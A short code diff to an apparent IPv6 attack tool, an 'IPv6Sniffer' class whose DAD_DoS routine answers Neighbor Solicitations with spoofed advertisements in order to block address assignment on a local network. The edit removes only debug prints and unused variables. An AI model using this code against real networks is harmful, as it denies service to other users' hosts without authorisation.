@@ -70,11 +70,7 @@ class IPv6Sniffer:
 
     # callback for when packets are received
     def callback(self, packet):
-        res = {}
-        res['ip'] = packet[IPv6].src
-        channel = False
         if ICMPv6ND_NS in packet:
-            channel = 'module_output'
             try:
                 self.DAD_DoS(packet)
             except Exception,e:
@@ -102,11 +98,6 @@ class IPv6Sniffer:
         
         options = ICMPv6NDOptSrcLLAddr()
         options.fields["lladdr"] = [get_if_hwaddr(i) for i in get_if_list()][0]
-
-        print ip_packet.show()
-        print advertisement.show()
-        print options.show()
-
 
         send(ip_packet/advertisement/options)
         out = "DAD_DoS: Overriding IPv6 Neighbor Solicitation: %s" % (tgt)
